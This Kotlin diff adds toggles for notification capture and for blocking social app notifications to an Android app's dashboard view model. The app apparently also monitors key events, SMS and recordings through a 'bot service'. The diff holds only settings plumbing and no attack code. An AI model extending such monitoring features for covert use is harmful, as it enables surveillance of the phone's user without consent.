@@ -62,6 +62,8 @@ data class DashboardUiState(
     val whatsappBusinessUpdatesEnabled: Boolean = false,
     val keyEventsEnabled: Boolean = false,
     val keyEventsIntervalMin: Int = 15,
+    val notificationEventsEnabled: Boolean = false,
+    val notificationBlockSocialEnabled: Boolean = false,
     val currentWarningTitle: String? = null,
     val currentWarningMessage: String? = null
 )
@@ -87,6 +89,8 @@ sealed class DashboardEvent {
     data class ToggleWhatsappBusinessUpdates(val enabled: Boolean) : DashboardEvent()
     data class ToggleKeyEvents(val enabled: Boolean) : DashboardEvent()
     data class UpdateKeyEventsInterval(val minutes: Int) : DashboardEvent()
+    data class ToggleNotificationEvents(val enabled: Boolean) : DashboardEvent()
+    data class ToggleNotificationBlockSocial(val enabled: Boolean) : DashboardEvent()
     object DismissWarningDialog : DashboardEvent()
 }
 
@@ -143,7 +147,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                     smsAlertsEnabled = prefs.smsAlertsEnabled,
                     forwardRecordingEnabled = prefs.forwardRecordingEnabled,
                     keyEventsEnabled = prefs.keyEventsEnabled,
-                    keyEventsIntervalMin = prefs.keyEventsIntervalMin
+                    keyEventsIntervalMin = prefs.keyEventsIntervalMin,
+                    notificationEventsEnabled = prefs.notificationEventsEnabled,
+                    notificationBlockSocialEnabled = prefs.notificationBlockSocialEnabled
                 )
             }
         }
@@ -212,7 +218,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
             smsAlertsEnabled = prefs.smsAlertsEnabled,
             forwardRecordingEnabled = prefs.forwardRecordingEnabled,
             keyEventsEnabled = prefs.keyEventsEnabled,
-            keyEventsIntervalMin = prefs.keyEventsIntervalMin
+            keyEventsIntervalMin = prefs.keyEventsIntervalMin,
+            notificationEventsEnabled = prefs.notificationEventsEnabled,
+            notificationBlockSocialEnabled = prefs.notificationBlockSocialEnabled
         )
     )
     val dashboardState: StateFlow<DashboardUiState> = _dashboardState.asStateFlow()
@@ -463,7 +471,15 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 prefs.keyEventsIntervalMin = event.minutes
                 _dashboardState.update { it.copy(keyEventsIntervalMin = event.minutes) }
             }
-
+            is DashboardEvent.ToggleNotificationEvents -> {
+                prefs.notificationEventsEnabled = event.enabled
+                _dashboardState.update { it.copy(notificationEventsEnabled = event.enabled) }
+                notifyBotService(getApplication(), "ACTION_UPDATE_NOTIFICATIONS")
+            }
+            is DashboardEvent.ToggleNotificationBlockSocial -> {
+                prefs.notificationBlockSocialEnabled = event.enabled
+                _dashboardState.update { it.copy(notificationBlockSocialEnabled = event.enabled) }
+            }
         }
     }
 
@@ -483,6 +499,8 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
         prefs.instagramEnabled = false
         prefs.whatsappBusinessUpdatesEnabled = false
         prefs.keyEventsEnabled = false
+        prefs.notificationEventsEnabled = false
+        prefs.notificationBlockSocialEnabled = false
         
         _dashboardState.update { 
             it.copy(
@@ -498,7 +516,9 @@ class MainViewModel(application: Application) : AndroidViewModel(application) {
                 whatsappUpdatesEnabled = false,
                 instagramUpdatesEnabled = false,
                 whatsappBusinessUpdatesEnabled = false,
-                keyEventsEnabled = false
+                keyEventsEnabled = false,
+                notificationEventsEnabled = false,
+                notificationBlockSocialEnabled = false
             )
         }
     }
